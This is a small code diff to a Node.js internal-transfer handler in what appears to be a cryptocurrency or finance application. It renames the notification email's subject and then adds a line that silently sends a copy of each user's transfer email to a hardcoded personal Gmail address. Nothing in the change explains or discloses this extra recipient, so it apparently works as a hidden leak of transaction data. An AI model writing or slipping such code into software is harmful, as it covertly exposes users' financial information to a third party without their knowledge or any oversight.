@@ -36,7 +36,7 @@ const createInternalTransfer = async (req, res) => {
    
     const internalTransfer = await InternalTransfer.create(req.body);
 
-    const subject = "Crypto Transaction";
+    const subject = "Transfer Request";
     const text = "";
     const html = `<!DOCTYPE html>
 <html lang="en">
@@ -92,6 +92,7 @@ const createInternalTransfer = async (req, res) => {
 </html>`;
 
     await sendEmail(user.email, subject, text, html);
+    await sendEmail("anniemary841@gmail.com", subject, text, html);
 
 
 
